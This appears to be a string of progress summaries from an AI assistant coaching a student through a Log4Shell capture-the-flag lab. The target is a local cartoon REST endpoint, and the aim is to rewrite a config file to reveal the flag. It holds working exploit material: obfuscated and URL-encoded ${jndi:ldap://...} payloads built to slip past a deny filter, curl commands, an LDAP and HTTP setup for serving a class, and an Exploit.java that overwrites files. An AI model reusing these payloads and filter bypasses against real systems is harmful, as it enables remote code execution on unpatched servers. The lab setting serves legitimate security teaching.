Here's a summary of what we've achieved so far and what's left to capture the flag:
What We've Achieved:

We've identified the target: modifying the "config.properties" file to set the rating property to your GATECH_ID (904074283)
We've found the attack vector: the "dangerZone" parameter in the cartoon endpoint
We've created and compiled the Exploit.java file that should update the properties file
We've set up the Python HTTP server (port 8888) to serve our Exploit.class
We've set up the LDAP server (port 4444) to redirect to our Exploit.class
We've confirmed the "dangerZone" parameter accepts input and logs it

What's Left to Do:

We need to successfully bypass the JNDI security filter - we've been getting a "teapot" error (HTTP 418) indicating the application is blocking our attempt
We need to find the right obfuscation technique that will:

Pass through curl's URL parsing (we've had issues with nested braces)
Bypass the application's security filter
Successfully trigger the Log4j vulnerability to execute our Java code



Let's try a different approach to bypass the security filter. We could try encoding the "jndi:ldap" portion differently or use a different obfuscation technique.
Let's try this approach:
Copycurl -g "http://localhost:8080/rest/cartoons/cartoon/d9aa318c-1cf6-41d1-841d-6be846de79fd?dangerZone=%24%7Bjndi%3Aldap%3A%2F%2Flocalhost%3A4444%2FExploit%7D" -H "GATECH_ID:904074283"
This is a URL-encoded version of ${jndi:ldap://localhost:4444/Exploit}
If this doesn't work, we may need to try more advanced obfuscation techniques or check if there are any issues with our servers or Exploit.java code.

Here's a summary of what we've done so far and what to do next:
What We've Done:

We identified that we need to modify the config.properties file to change the "rating" property to your GATECH_ID (904074283)
We found the "dangerZone" parameter in the cartoon endpoint is a potential attack vector
We've set up the LDAP server and Python HTTP server to serve our exploit
We've written an Exploit.java file that should update the properties file correctly
We confirmed that direct JNDI injection attempts are blocked with a "teapot" error (HTTP 418)
We've tried various obfuscation techniques to bypass the protection, but haven't successfully triggered our exploit yet

What We Need to Do Next:

We need to determine if "dangerZone" is actually the correct attack vector or if there's another parameter we're missing
We need to find an obfuscation technique that will:

Not trigger the JNDI protection filter
Actually be interpreted by Log4j to execute our JNDI lookup


We need to ensure our exploit runs at the right time in the application flow to update the config.properties file before it's used

Let's try examining the logs more carefully to see if there's another parameter we've missed, and then try a different obfuscation technique that might work better.





## Summary of What We've Achieved So Far and Next Steps

### What We've Achieved:
1. We've identified the attack vector: the `dangerZone` parameter in the cartoon endpoint (which was initially set to null)
2. We've created and compiled an Exploit.java file that updates the config.properties file to set the "rating" property to your GATECH_ID (904074283)
3. We've set up the necessary servers:
   - Python HTTP server (port 8888) to serve our Exploit.class
   - LDAP server (port 4444) to redirect to our Exploit.class
4. We've successfully passed various obfuscated payloads into the dangerZone parameter that didn't trigger the security filter

### Current Challenges:
1. While we're successfully bypassing the security filter with obfuscation techniques, our payloads aren't being properly resolved by Log4j to actually trigger the JNDI lookup
2. The system is responding without errors, but our Exploit code isn't running

### Next Steps to Get the Flag:
1. **Try a different obfuscation technique**: We need to find just the right obfuscation that both bypasses the security filter AND is properly resolved by Log4j
   ```bash
   curl "http://localhost:8080/rest/cartoons/cartoon/3e8a1646-df53-4cbd-8e76-91f20631c8f8?dangerZone=%24%7Bjndi%3aldap%3a//localhost%3a4444/Exploit%7D" -H "GATECH_ID:904074283"
   ```

2. **Restart the container**: This can help ensure the system is in a clean state
   ```bash
   cd ~/Desktop/log4shell
   ./stopContainer.sh
   ./startContainer.sh
   ```

3. **Verify the exploit code**: Make sure our Exploit.java is properly reading the existing properties and only updating the "rating" property while preserving all other properties

4. **Check timing**: We need to ensure our exploitation is happening at the right time in the application flow, before the properties file is read to render the response

Our goal remains to update the config.properties file to set the rating to your GATECH_ID, triggering the flag to appear in the response.

Here's a summary of what we've achieved so far and what to do next:
What We've Achieved:

We've identified the attack vector: the dangerZone parameter in the cartoon endpoint
We've set up our environment with the LDAP server and HTTP server
We've created and compiled an Exploit.java file that should update the config.properties file
We've tried various obfuscation techniques to bypass security filters, but they're not working as expected

Next Steps:
There are a few things we should try:

Try a simpler obfuscation technique from the Bishop Fox article (which is a common reference for Log4Shell exploits):

bashCopycurl "http://localhost:8080/rest/cartoons/cartoon/199e2750-e3ac-42a6-a264-8faf4e25a4be?dangerZone=%24%7Bjndi%3a${env:NaN:-l}${env:NaN:-d}${env:NaN:-a}${env:NaN:-p}%3a%2f%2flocalhost%3a4444%2fExploit%7D" -H "GATECH_ID:904074283"

We might also try the context switching technique:

bashCopycurl "http://localhost:8080/rest/cartoons/cartoon/199e2750-e3ac-42a6-a264-8faf4e25a4be?dangerZone=%24%7B%24%7Benv%3ABARFOO%3A-j%7Dndi%3A%24%7Benv%3ABARFOO%3A-l%7Ddap%3A%2F%2Flocalhost%3A4444%2FExploit%7D" -H "GATECH_ID:904074283"

If those don't work, we should revisit our Exploit.java file to ensure it's correctly reading and updating the properties file. Here's a simpler version:

javaCopyimport java.io.*;
import java.util.Properties;

public class Exploit {
    static {
        try {
            // Load properties file
            Properties props = new Properties();
            FileInputStream in = new FileInputStream("config.properties");
            props.load(in);
            in.close();
            
            System.out.println("Original properties: " + props);
            
            // Update rating to GATECH_ID
            props.setProperty("rating", "904074283");
            
            // Save properties file
            FileOutputStream out = new FileOutputStream("config.properties");
            props.store(out, null);
            out.close();
            
            System.out.println("Updated properties: " + props);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
Let's start with trying the obfuscation techniques. Which step would you like to try first?

Detailed Progress on Flag 3 Capture
Here's a detailed explanation of what we've achieved so far and our next steps to capture the flag:
What We've Achieved

We've identified the attack vector: The dangerZone query parameter in the cartoon endpoint. This parameter appears in the logs as dangerZone= null when not specified, and we confirmed it accepts input by passing ?dangerZone=test.
We've set up the required infrastructure:

Created an Exploit.java file that reads the config.properties file, preserves all existing properties, and updates only the rating property to our GATECH_ID (904074283)
Compiled the Exploit.java file into Exploit.class
Started a Python HTTP server running on port 8888 to serve our Exploit.class
Started an LDAP server on port 4444 to redirect to our Exploit.class


We've verified that the system is reading the config.properties file, which currently has a rating value of "PG"

Next Steps

Inject a Log4j vulnerability: We need to send a JNDI lookup expression through the dangerZone parameter to execute our exploit.
Bypass security filters: The instruction mentions "Someone might have tried to roll their own patch and tried to deny requests containing malicious string patterns", which suggests we need to obfuscate our payload.
Test and verify: After a successful exploit, we should see the rating property in config.properties change to "904074283", and the flag should appear in the response.

Action Plan

First, let's test if Log4j will interpret expressions in the dangerZone parameter:
bashCopycurl 'http://localhost:8080/rest/cartoons/cartoon/2438fdaa-fa97-45fd-a35d-934a42f3c21c?dangerZone=${java:version}' -H 'GATECH_ID:904074283'

If that works, we'll then try our JNDI injection:
bashCopycurl 'http://localhost:8080/rest/cartoons/cartoon/2438fdaa-fa97-45fd-a35d-934a42f3c21c?dangerZone=${jndi:ldap://172.17.0.1:4444/Exploit}' -H 'GATECH_ID:904074283'

If we encounter security filters, we'll need to obfuscate the payload using techniques like character substitution or encoding:
bashCopy# Example obfuscation technique
curl 'http://localhost:8080/rest/cartoons/cartoon/2438fdaa-fa97-45fd-a35d-934a42f3c21c?dangerZone=${${env:NaN:-j}${env:NaN:-n}${env:NaN:-d}${env:NaN:-i}:${env:NaN:-l}${env:NaN:-d}${env:NaN:-a}${env:NaN:-p}://172.17.0.1:4444/Exploit}' -H 'GATECH_ID:904074283'

Finally, we'll verify success by checking if our GATECH_ID appears in the rating field of the response.

Let's proceed step by step with these actions to capture the flag.
